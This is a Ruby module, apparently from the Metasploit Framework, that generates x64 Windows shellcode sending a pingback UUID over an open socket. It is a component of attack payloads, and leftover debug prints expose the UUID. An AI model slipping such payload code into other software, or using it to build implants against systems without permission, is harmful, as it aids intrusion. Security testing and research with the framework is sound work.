# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/pingback'

module Msf

###
#
# Basic send_uuid stub for Windows ARCH_X64 payloads
#
###

module Payload::Windows::SendPingback_x64

  #
  # Generate assembly code that writes the UUID to the socket.
  #
  # This code assumes that the block API pointer is in rbp, and
  # the communications socket handle is in rdi.
  #
  def asm_send_pingback(uuid=nil)
    pingback_uuid ||= generate_pingback_uuid
    puts("UUID in send_pingback: " + pingback_uuid.to_s.gsub("-", ""))
    uuid_as_db = "0x" + pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
    puts("UUID as db in send_pingback: " + uuid_as_db)
    puts("uuid_as_db.length: " + uuid_as_db.split(",").length.to_s)

    asm =%Q^
      send_pingback:
        xor r9, r9              ; flags
        push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
        pop r8
        call get_pingback_address  ; put uuid buffer on the stack
        db #{uuid_as_db}  ; PINGBACK_UUID
      get_pingback_address:
        pop rdx                ; PINGBACK UUID address
        mov rcx, rdi           ; Socket handle
        mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
        call rbp               ; call send
    ^
    asm

  end

  def uuid_required_size
    # Start with the number of bytes required for the instructions
    space = 25

    # a UUID is 16 bytes
    space += 16

    space
  end

end

end

